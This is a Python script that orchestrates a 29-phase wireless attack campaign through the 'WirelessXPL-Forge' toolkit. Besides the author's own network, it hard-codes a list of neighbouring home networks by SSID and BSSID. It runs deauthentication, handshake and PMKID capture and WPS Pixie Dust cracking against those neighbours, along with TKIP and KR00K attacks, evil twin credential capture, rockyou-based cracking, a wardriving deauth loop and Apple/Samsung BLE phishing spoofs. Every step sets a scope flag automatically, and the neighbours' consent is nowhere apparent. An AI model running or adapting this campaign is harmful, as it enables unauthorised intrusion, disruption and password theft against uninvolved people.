#!/usr/bin/env python3
"""
WirelessXPL-Forge — Campanha de Testes Massivos
Modo: usuário interagindo como no Metasploit (use, set, run)
Interface: wlx24050f3d5f0a (RT5370 via WSL2)
"""

import subprocess
import sys
import time
import json
import os
from pathlib import Path
from datetime import datetime

TIMESTAMP = datetime.now().strftime("%Y%m%d_%H%M%S")
WXF_DIR = str(Path(__file__).parent.parent)
IFACE = "wlx24050f3d5f0a"
OUTDIR = f"/tmp/wxf_campaign_{TIMESTAMP}"
os.makedirs(OUTDIR, exist_ok=True)

LOG = open(f"{OUTDIR}/campaign.log", "w")

# ─────────────────────────────────────────────────────────────────────────────
# Redes descobertas no scan anterior
# ─────────────────────────────────────────────────────────────────────────────
OWN_NET_2G = {"ssid": "UNIAOGEEK",    "bssid": "72:4E:6B:1A:CB:90", "ch": "1",  "enc": "WPA2", "wps": "2.0"}
OWN_NET_5G = {"ssid": "UNIAOGEEK_5G", "bssid": "72:4E:6B:1A:CB:94", "ch": "48", "enc": "WPA2", "wps": "no"}
CLARO_WIFI  = {"ssid": "#CLARO-WIFI", "bssid": "EA:20:E2:06:10:4C", "ch": "1",  "enc": "OPN",  "wps": "no"}

# Redes vizinhas de alta prioridade (maior sinal, WPS ativo, TKIP)
NEIGHBOR_HIGH = [
    {"ssid": "APT1104C_2G",            "bssid": "20:35:43:59:6C:1C", "ch": "1",  "enc": "WPA2",    "wps": "2.0"},
    {"ssid": "Ricardo",                "bssid": "84:01:12:BF:F4:3D", "ch": "1",  "enc": "WPA2",    "wps": "2.0"},
    {"ssid": "Denise",                 "bssid": "E8:20:E2:06:0F:4B", "ch": "1",  "enc": "WPA2+WPA","wps": "no",  "tkip": True},
    {"ssid": "NET_2G060F46-IoT",       "bssid": "EA:20:E2:06:10:4E", "ch": "1",  "enc": "WPA2",    "wps": "2.0"},
    {"ssid": "VIVO MARIZE",            "bssid": "90:0A:62:C3:6C:1F", "ch": "6",  "enc": "WPA2",    "wps": "2.0"},
    {"ssid": "MAURI",                  "bssid": "E8:45:8B:AE:00:08", "ch": "6",  "enc": "WPA2",    "wps": "2.0"},
    {"ssid": "THOR",                   "bssid": "10:98:5F:1A:DA:7F", "ch": "6",  "enc": "WPA2",    "wps": "2.0"},
    {"ssid": "VOE_AP1704",             "bssid": "CC:29:BD:20:18:AB", "ch": "3",  "enc": "WPA2+WPA","wps": "2.0", "tkip": True},
    {"ssid": "TrOll_MaStEr_BLaStEr_2Ghz","bssid":"F0:25:8E:EA:A1:38","ch":"10","enc":"WPA2+WPA","wps": "2.0", "tkip": True},
    {"ssid": "LICHTHOUSE",             "bssid": "74:3A:EF:9C:45:75", "ch": "8",  "enc": "WPA2",    "wps": "2.0"},
    {"ssid": "1-708",                  "bssid": "44:3B:32:B2:CF:81", "ch": "7",  "enc": "WPA2",    "wps": "1.0"},  # WPS 1.0!
    {"ssid": "JOAQUIM",                "bssid": "10:98:5F:5D:00:5F", "ch": "6",  "enc": "WPA2",    "wps": "2.0"},
    {"ssid": "Teixeira",               "bssid": "A2:40:6F:E5:26:D4", "ch": "2",  "enc": "WPA2",    "wps": "2.0"},
    {"ssid": "MERCUSYS_DDB8",          "bssid": "38:6B:1C:3F:DD:B8", "ch": "2",  "enc": "WPA2",    "wps": "2.0"},
]

results = []


# ─────────────────────────────────────────────────────────────────────────────
# Helpers
# ─────────────────────────────────────────────────────────────────────────────

def banner(title):
    line = "═" * 65
    print(f"\n\033[1;36m{line}\033[0m")
    print(f"\033[1;36m  WirelessXPL-Forge :: {title}\033[0m")
    print(f"\033[1;36m{line}\033[0m\n")
    LOG.write(f"\n{'='*65}\n  {title}\n{'='*65}\n")
    LOG.flush()


def wxf(module, opts: dict, timeout: int = 60) -> str:
    """Executa um módulo via WirelessXPL-Forge CLI (wxf.py -m <mod> -s ...)"""
    cmd = ["python3", "wxf.py", "-m", module]
    for k, v in opts.items():
        cmd += ["-s", f"{k} {v}"]
    
    print(f"\033[32m[wxf]\033[0m use {module}")
    for k, v in opts.items():
        print(f"\033[32m[wxf]\033[0m   set {k} {v}")
    print(f"\033[33m[wxf]\033[0m run")
    
    LOG.write(f"\n[MODULE] {module}\n[OPTS] {opts}\n")
    
    try:
        r = subprocess.run(
            cmd,
            capture_output=True, text=True,
            timeout=timeout,
            cwd=WXF_DIR,
        )
        output = r.stdout + r.stderr
        print(output[:800] if len(output) > 800 else output)
        LOG.write(f"[OUTPUT]\n{output}\n")
        LOG.flush()
        return output
    except subprocess.TimeoutExpired:
        msg = f"[!] Timeout após {timeout}s — módulo: {module}"
        print(f"\033[31m{msg}\033[0m")
        LOG.write(f"{msg}\n")
        return "TIMEOUT"
    except Exception as e:
        msg = f"[!] Erro: {e}"
        print(f"\033[31m{msg}\033[0m")
        LOG.write(f"{msg}\n")
        return str(e)


def record(module, target, status, detail=""):
    results.append({
        "module": module, "target": target["ssid"],
        "bssid": target["bssid"], "status": status, "detail": detail[:200]
    })


# ─────────────────────────────────────────────────────────────────────────────
# ■ FASE 1: Tool Audit / Prerequisites
# ─────────────────────────────────────────────────────────────────────────────

banner("FASE 1 — Audit de Ferramentas e Pré-requisitos")

out = wxf("generic/external/wireless_tool_prereq_audit", {
    "interface": IFACE,
    "check_inject": "true",
    "verbose": "true",
}, timeout=30)

# ─────────────────────────────────────────────────────────────────────────────
# ■ FASE 2: WiFi Security Analyzer — varredura de todas as redes
# ─────────────────────────────────────────────────────────────────────────────

banner("FASE 2 — WiFi Security Analyzer (todas as redes)")

out = wxf("generic/wifi_lab/wifi_security_analyzer", {
    "interface":       IFACE,
    "scan_duration":   "30",
    "band":            "bg",
    "output_dir":      OUTDIR,
    "i_know_scope":    "true",
}, timeout=45)

# ─────────────────────────────────────────────────────────────────────────────
# ■ FASE 3: Packet Injection Lab
# ─────────────────────────────────────────────────────────────────────────────

banner("FASE 3 — Packet Injection Test")

out = wxf("generic/wifi_lab/packet_injection_lab", {
    "interface":    IFACE,
    "target_bssid": OWN_NET_2G["bssid"],
    "i_know_scope": "true",
}, timeout=30)
record("packet_injection_lab", OWN_NET_2G, "PASS" if "inject" in out.lower() else "PARTIAL", out[:200])

# ─────────────────────────────────────────────────────────────────────────────
# ■ FASE 4: hcxdumptool bridge — PMKID de todas as redes
# ─────────────────────────────────────────────────────────────────────────────

banner("FASE 4 — PMKID Live Capture (hcxdumptool bridge, 90s)")

out = wxf("generic/external/hcxdumptool_live_bridge", {
    "interface":    IFACE,
    "output_file":  f"{OUTDIR}/pmkid_live.pcapng",
    "duration":     "90",
    "i_know_scope": "true",
}, timeout=110)
record("hcxdumptool_live_bridge", OWN_NET_2G, "DONE", out[:200])

# ─────────────────────────────────────────────────────────────────────────────
# ■ FASE 5: PMKID Autopwn (rede própria)
# ─────────────────────────────────────────────────────────────────────────────

banner("FASE 5 — PMKID Autopwn (UNIAOGEEK 2.4GHz)")

out = wxf("generic/wifi_lab/pmkid_autopwn", {
    "interface":      IFACE,
    "target_bssid":   OWN_NET_2G["bssid"],
    "channel":        OWN_NET_2G["ch"],
    "output_dir":     OUTDIR,
    "i_know_scope":   "true",
}, timeout=60)
record("pmkid_autopwn", OWN_NET_2G, "DONE", out[:200])

# ─────────────────────────────────────────────────────────────────────────────
# ■ FASE 6: Handshake Snooper + Deauth (rede própria 2.4 + 5GHz)
# ─────────────────────────────────────────────────────────────────────────────

banner("FASE 6 — Handshake Snooper + Deauth (UNIAOGEEK)")

for net in [OWN_NET_2G, OWN_NET_5G]:
    out = wxf("generic/wifi_lab/handshake_snooper", {
        "interface":       IFACE,
        "target_bssid":    net["bssid"],
        "target_channel":  net["ch"],
        "deauth_count":    "10",
        "deauth_rounds":   "3",
        "capture_timeout": "40",
        "output_dir":      OUTDIR,
        "pmkid_first":     "true",
        "i_know_scope":    "true",
    }, timeout=120)
    record("handshake_snooper", net, "DONE", out[:200])
    time.sleep(2)

# ─────────────────────────────────────────────────────────────────────────────
# ■ FASE 7: Handshake Snooper — redes vizinhas (varredura rápida)
# ─────────────────────────────────────────────────────────────────────────────

banner("FASE 7 — Handshake Collection (todas as redes vizinhas)")

for net in NEIGHBOR_HIGH[:8]:
    print(f"\n\033[33m[TARGET]\033[0m {net['ssid']} ({net['bssid']}) ch:{net['ch']}")
    out = wxf("generic/wifi_lab/handshake_snooper", {
        "interface":       IFACE,
        "target_bssid":    net["bssid"],
        "target_channel":  net["ch"],
        "deauth_count":    "5",
        "deauth_rounds":   "2",
        "capture_timeout": "20",
        "output_dir":      OUTDIR,
        "pmkid_first":     "true",
        "i_know_scope":    "true",
    }, timeout=50)
    status = "HANDSHAKE" if "handshake" in out.lower() and "success" in out.lower() else "PMKID_ATTEMPT"
    record("handshake_snooper", net, status, out[:200])
    time.sleep(1)

# ─────────────────────────────────────────────────────────────────────────────
# ■ FASE 8: WPS MultiMode — Pixie Dust em todos WPS ativos
# ─────────────────────────────────────────────────────────────────────────────

banner("FASE 8 — WPS MultiMode (Pixie Dust + PIN)")

all_wps_targets = [OWN_NET_2G] + [n for n in NEIGHBOR_HIGH if n.get("wps", "no") not in ("no", "")]

for net in all_wps_targets[:10]:
    print(f"\n\033[33m[WPS TARGET]\033[0m {net['ssid']} WPS {net['wps']}")
    mode = "pixie_dust" if net.get("wps") == "1.0" else "auto"
    out = wxf("generic/wifi_lab/wps_multimode", {
        "interface":    IFACE,
        "target_bssid": net["bssid"],
        "channel":      net["ch"],
        "mode":         mode,
        "i_know_scope": "true",
        "timeout":      "45",
    }, timeout=55)
    cracked = "pin" in out.lower() and ("found" in out.lower() or "success" in out.lower())
    status = "CRACKED" if cracked else "PROTECTED"
    record("wps_multimode", net, status, out[:300])
    time.sleep(2)

# ─────────────────────────────────────────────────────────────────────────────
# ■ FASE 9: Auth Flood (rede própria)
# ─────────────────────────────────────────────────────────────────────────────

banner("FASE 9 — Auth Flood (UNIAOGEEK 2.4GHz)")

out = wxf("generic/wifi_lab/auth_flood", {
    "interface":    IFACE,
    "bssid":        OWN_NET_2G["bssid"],
    "channel":      OWN_NET_2G["ch"],
    "count":        "500",
    "duration":     "15",
    "i_know_scope": "true",
}, timeout=30)
record("auth_flood", OWN_NET_2G, "DONE", out[:200])

# ─────────────────────────────────────────────────────────────────────────────
# ■ FASE 10: Beacon Flood
# ─────────────────────────────────────────────────────────────────────────────

banner("FASE 10 — Beacon Flood (SSIDs falsos)")

out = wxf("generic/wifi_lab/beacon_flood_advanced", {
    "interface":    IFACE,
    "count":        "50",
    "duration":     "15",
    "random_ssids": "true",
    "channel":      "1",
    "i_know_scope": "true",
}, timeout=30)
record("beacon_flood_advanced", OWN_NET_2G, "DONE", out[:200])

# ─────────────────────────────────────────────────────────────────────────────
# ■ FASE 11: Deauth Multimode (broadcast em todas as redes)
# ─────────────────────────────────────────────────────────────────────────────

banner("FASE 11 — Deauth Multimode (broadcast por rede)")

for net in [OWN_NET_2G] + NEIGHBOR_HIGH[:5]:
    out = wxf("generic/wifi_lab/deauth_multimode", {
        "interface":    IFACE,
        "target_bssid": net["bssid"],
        "channel":      net["ch"],
        "count":        "10",
        "mode":         "broadcast",
        "i_know_scope": "true",
    }, timeout=25)
    record("deauth_multimode", net, "DONE", out[:150])
    time.sleep(1)

# ─────────────────────────────────────────────────────────────────────────────
# ■ FASE 12: Deauth CSA Suite
# ─────────────────────────────────────────────────────────────────────────────

banner("FASE 12 — Deauth CSA Suite (Channel Switch Announcement)")

out = wxf("generic/wifi_lab/deauth_csa_suite", {
    "interface":    IFACE,
    "target_bssid": OWN_NET_2G["bssid"],
    "channel":      OWN_NET_2G["ch"],
    "csa_channel":  "11",
    "i_know_scope": "true",
}, timeout=30)
record("deauth_csa_suite", OWN_NET_2G, "DONE", out[:200])

# ─────────────────────────────────────────────────────────────────────────────
# ■ FASE 13: Conexão na rede aberta + Enumeração
# ─────────────────────────────────────────────────────────────────────────────

banner("FASE 13 — Conexão e Enumeração: #CLARO-WIFI (OPN)")

out = wxf("generic/wifi_lab/connectivity_portal", {
    "interface":    IFACE,
    "target_ssid":  CLARO_WIFI["ssid"],
    "target_bssid": CLARO_WIFI["bssid"],
    "channel":      CLARO_WIFI["ch"],
    "scan_hosts":   "true",
    "test_internet":"true",
    "i_know_scope": "true",
}, timeout=60)
connected = "connected" in out.lower() or "ip" in out.lower()
record("connectivity_portal", CLARO_WIFI, "CONNECTED" if connected else "PORTAL_BLOCKED", out[:400])

# ─────────────────────────────────────────────────────────────────────────────
# ■ FASE 14: KARMA/MANA Attack (clientes desassociados)
# ─────────────────────────────────────────────────────────────────────────────

banner("FASE 14 — KARMA/MANA Attack (clientes órfãos)")

out = wxf("generic/wifi_lab/karma_mana_attack", {
    "interface":    IFACE,
    "duration":     "30",
    "mana_mode":    "true",
    "i_know_scope": "true",
}, timeout=45)
record("karma_mana_attack", {"ssid": "BROADCAST", "bssid": "ff:ff:ff:ff:ff:ff"}, "DONE", out[:200])

# ─────────────────────────────────────────────────────────────────────────────
# ■ FASE 15: Evil Twin Workflow (rede própria)
# ─────────────────────────────────────────────────────────────────────────────

banner("FASE 15 — Evil Twin Workflow (UNIAOGEEK clone)")

out = wxf("generic/wifi_lab/evil_twin_workflow", {
    "interface":    IFACE,
    "target_ssid":  OWN_NET_2G["ssid"],
    "target_bssid": OWN_NET_2G["bssid"],
    "channel":      OWN_NET_2G["ch"],
    "duration":     "20",
    "capture_creds":"true",
    "i_know_scope": "true",
}, timeout=35)
creds = "credential" in out.lower() or "psk" in out.lower() or "password" in out.lower()
record("evil_twin_workflow", OWN_NET_2G, "CREDS_CAPTURED" if creds else "RUNNING", out[:300])

# ─────────────────────────────────────────────────────────────────────────────
# ■ FASE 16: FragAttacks (CVE-2020-26140)
# ─────────────────────────────────────────────────────────────────────────────

banner("FASE 16 — FragAttacks CVE-2020-26140 (todas as redes)")

for net in [OWN_NET_2G] + NEIGHBOR_HIGH[:4]:
    out = wxf("generic/wifi_lab/fragattacks", {
        "interface":    IFACE,
        "target_bssid": net["bssid"],
        "channel":      net["ch"],
        "mode":         "check",
        "i_know_scope": "true",
    }, timeout=40)
    vuln = "vulnerable" in out.lower() or "fragattack" in out.lower()
    record("fragattacks", net, "VULNERABLE" if vuln else "CHECKED", out[:200])
    time.sleep(1)

# ─────────────────────────────────────────────────────────────────────────────
# ■ FASE 17: KRACK Attack
# ─────────────────────────────────────────────────────────────────────────────

banner("FASE 17 — KRACK Attack (WPA2 4-way replay)")

out = wxf("generic/wifi_lab/krack_attack", {
    "interface":    IFACE,
    "target_bssid": OWN_NET_2G["bssid"],
    "channel":      OWN_NET_2G["ch"],
    "i_know_scope": "true",
}, timeout=45)
record("krack_attack", OWN_NET_2G, "DONE", out[:200])

# ─────────────────────────────────────────────────────────────────────────────
# ■ FASE 18: TKIP Attack Suite (redes com TKIP)
# ─────────────────────────────────────────────────────────────────────────────

banner("FASE 18 — TKIP Attack Suite (redes com TKIP)")

tkip_nets = [n for n in NEIGHBOR_HIGH if n.get("tkip")]
for net in tkip_nets:
    print(f"\n\033[31m[TKIP TARGET]\033[0m {net['ssid']} ({net['bssid']})")
    out = wxf("generic/wifi_lab/tkip_attack_suite", {
        "interface":    IFACE,
        "target_bssid": net["bssid"],
        "channel":      net["ch"],
        "mode":         "mic_countermeasures",
        "i_know_scope": "true",
    }, timeout=40)
    record("tkip_attack_suite", net, "DONE", out[:200])
    time.sleep(1)

# ─────────────────────────────────────────────────────────────────────────────
# ■ FASE 19: PCAP PMKID Attack (arquivo capturado)
# ─────────────────────────────────────────────────────────────────────────────

banner("FASE 19 — PCAP PMKID Attack (hashes capturados anteriormente)")

out = wxf("generic/pcap/pcap_pmkid_attack", {
    "pcap_file":    "/tmp/pmkid_all.pcapng",
    "output_file":  f"{OUTDIR}/pmkid_extracted.hash",
    "auto_crack":   "true",
    "wordlist":     "/usr/share/wordlists/rockyou.txt",
}, timeout=120)
cracked = "cracked" in out.lower() or "found" in out.lower()
record("pcap_pmkid_attack", OWN_NET_2G, "CRACKED" if cracked else "HASHES_EXTRACTED", out[:300])

# ─────────────────────────────────────────────────────────────────────────────
# ■ FASE 20: PCAP Handshake Extractor
# ─────────────────────────────────────────────────────────────────────────────

banner("FASE 20 — PCAP Handshake Extractor + Crack")

for cap_file in ["/tmp/hs_uniaogeek-01.cap", f"{OUTDIR}/pmkid_live.pcapng"]:
    if Path(cap_file).exists():
        out = wxf("generic/pcap/pcap_handshake_extractor", {
            "pcap_file":  cap_file,
            "output_dir": OUTDIR,
            "auto_crack": "true",
            "wordlist":   "/usr/share/wordlists/rockyou.txt",
        }, timeout=120)
        record("pcap_handshake_extractor", OWN_NET_2G, "DONE", out[:200])

# ─────────────────────────────────────────────────────────────────────────────
# ■ FASE 21: WPA3 / SAE Flood
# ─────────────────────────────────────────────────────────────────────────────

banner("FASE 21 — WPA3 SAE Flood (se suportado)")

out = wxf("generic/wifi_lab/wpa3_sae_flood_native", {
    "interface":    IFACE,
    "target_bssid": OWN_NET_2G["bssid"],
    "channel":      OWN_NET_2G["ch"],
    "duration":     "10",
    "i_know_scope": "true",
}, timeout=25)
record("wpa3_sae_flood_native", OWN_NET_2G, "DONE", out[:200])

# ─────────────────────────────────────────────────────────────────────────────
# ■ FASE 22: KR00K Attack
# ─────────────────────────────────────────────────────────────────────────────

banner("FASE 22 — KR00K Attack (CVE-2019-15126)")

for net in [OWN_NET_2G] + NEIGHBOR_HIGH[:3]:
    out = wxf("generic/wifi_lab/kr00k_attack", {
        "interface":    IFACE,
        "target_bssid": net["bssid"],
        "channel":      net["ch"],
        "i_know_scope": "true",
    }, timeout=35)
    vuln = "vulnerable" in out.lower() or "kr00k" in out.lower()
    record("kr00k_attack", net, "VULNERABLE" if vuln else "CHECKED", out[:200])
    time.sleep(1)

# ─────────────────────────────────────────────────────────────────────────────
# ■ FASE 23: AP-less Client Attack (clientes sem AP)
# ─────────────────────────────────────────────────────────────────────────────

banner("FASE 23 — AP-less Client Attack (fake probe responses)")

out = wxf("generic/wifi_lab/ap_less_client_attack", {
    "interface":    IFACE,
    "duration":     "20",
    "i_know_scope": "true",
}, timeout=35)
record("ap_less_client_attack", {"ssid": "BROADCAST", "bssid": "ff:ff:ff:ff:ff:ff"}, "DONE", out[:200])

# ─────────────────────────────────────────────────────────────────────────────
# ■ FASE 24: SSID Confusion Attack
# ─────────────────────────────────────────────────────────────────────────────

banner("FASE 24 — SSID Confusion Attack")

out = wxf("generic/wifi_lab/ssid_confusion", {
    "interface":    IFACE,
    "target_bssid": OWN_NET_2G["bssid"],
    "channel":      OWN_NET_2G["ch"],
    "i_know_scope": "true",
}, timeout=30)
record("ssid_confusion", OWN_NET_2G, "DONE", out[:200])

# ─────────────────────────────────────────────────────────────────────────────
# ■ FASE 25: Wardriving Deauth Loop
# ─────────────────────────────────────────────────────────────────────────────

banner("FASE 25 — Wardriving Deauth Loop (todos os canais)")

out = wxf("generic/wifi_lab/wardriving_deauth_loop", {
    "interface":    IFACE,
    "duration":     "30",
    "deauth_count": "5",
    "output_dir":   OUTDIR,
    "i_know_scope": "true",
}, timeout=45)
record("wardriving_deauth_loop", {"ssid": "ALL", "bssid": "ALL"}, "DONE", out[:200])

# ─────────────────────────────────────────────────────────────────────────────
# ■ FASE 26: BLE Scan + Enumerate + Attacks
# ─────────────────────────────────────────────────────────────────────────────

banner("FASE 26 — BLE Scan + Enumerate")

out = wxf("generic/bluetooth/btle_scan", {
    "duration":     "20",
    "passive":      "false",
    "output_dir":   OUTDIR,
    "i_know_scope": "true",
}, timeout=30)
record("btle_scan", {"ssid": "BLE", "bssid": "ALL"}, "DONE", out[:200])

# BLE Enumerate se dispositivos encontrados
out2 = wxf("generic/bluetooth/btle_enumerate", {
    "duration":     "15",
    "i_know_scope": "true",
}, timeout=25)
record("btle_enumerate", {"ssid": "BLE", "bssid": "ALL"}, "DONE", out2[:200])

# BLE Extra Attacks
out3 = wxf("generic/bluetooth/ble_extra_attacks", {
    "mode":         "advertisement_flood",
    "duration":     "15",
    "i_know_scope": "true",
}, timeout=25)
record("ble_extra_attacks", {"ssid": "BLE", "bssid": "ALL"}, "DONE", out3[:200])

# ─────────────────────────────────────────────────────────────────────────────
# ■ FASE 27: BLE Phishing (Apple/Samsung spoofing)
# ─────────────────────────────────────────────────────────────────────────────

banner("FASE 27 — BLE Phishing (advertisement spoof)")

out = wxf("generic/bluetooth/ble_phishing", {
    "mode":         "apple_findmy",
    "duration":     "20",
    "i_know_scope": "true",
}, timeout=30)
record("ble_phishing", {"ssid": "BLE_PHISH", "bssid": "ALL"}, "DONE", out[:200])

# ─────────────────────────────────────────────────────────────────────────────
# ■ FASE 28: MoMo Integrated Attack (KARMA+PMKID+downgrade)
# ─────────────────────────────────────────────────────────────────────────────

banner("FASE 28 — MoMo Integrated Attack")

out = wxf("generic/wifi_lab/momo_integrated_attack", {
    "interface":    IFACE,
    "target_bssid": OWN_NET_2G["bssid"],
    "channel":      OWN_NET_2G["ch"],
    "duration":     "30",
    "i_know_scope": "true",
}, timeout=45)
record("momo_integrated_attack", OWN_NET_2G, "DONE", out[:300])

# ─────────────────────────────────────────────────────────────────────────────
# ■ FASE 29: Adaptive Harvest (score-driven)
# ─────────────────────────────────────────────────────────────────────────────

banner("FASE 29 — Adaptive Harvest (score-driven PMKID)")

out = wxf("generic/wifi_lab/adaptive_harvest", {
    "interface":    IFACE,
    "duration":     "45",
    "min_signal":   "-80",
    "output_dir":   OUTDIR,
    "i_know_scope": "true",
}, timeout=60)
record("adaptive_harvest", {"ssid": "ALL", "bssid": "ALL"}, "DONE", out[:300])

# ─────────────────────────────────────────────────────────────────────────────
# ■ RELATÓRIO FINAL
# ─────────────────────────────────────────────────────────────────────────────

banner("RELATÓRIO FINAL — Resumo da Campanha")

print(f"\n{'─'*65}")
print(f"{'Módulo':<35} {'Alvo':<20} {'Status':<15}")
print(f"{'─'*65}")

for r in results:
    color = "\033[32m" if r["status"] in ("CRACKED","CONNECTED","VULNERABLE","CREDS_CAPTURED") else \
            "\033[31m" if r["status"] in ("PROTECTED","PORTAL_BLOCKED") else "\033[33m"
    print(f"{color}{r['module']:<35}\033[0m {r['target']:<20} {r['status']:<15}")

print(f"{'─'*65}")
print(f"\nTotal de módulos executados: {len(results)}")
cracked = [r for r in results if r["status"] in ("CRACKED","CREDS_CAPTURED","CONNECTED","VULNERABLE")]
print(f"Comprometidos/Vulneráveis:   {len(cracked)}")
for c in cracked:
    print(f"  \033[32m[+]\033[0m {c['target']} via {c['module']}")

# Salvar relatório JSON
with open(f"{OUTDIR}/campaign_results.json", "w") as f:
    json.dump({"timestamp": TIMESTAMP, "results": results, "total": len(results), "compromised": len(cracked)}, f, indent=2)

print(f"\n\033[32m[+]\033[0m Output: {OUTDIR}/")
print(f"\033[32m[+]\033[0m Log: {OUTDIR}/campaign.log")
print(f"\033[32m[+]\033[0m JSON: {OUTDIR}/campaign_results.json")

LOG.close()
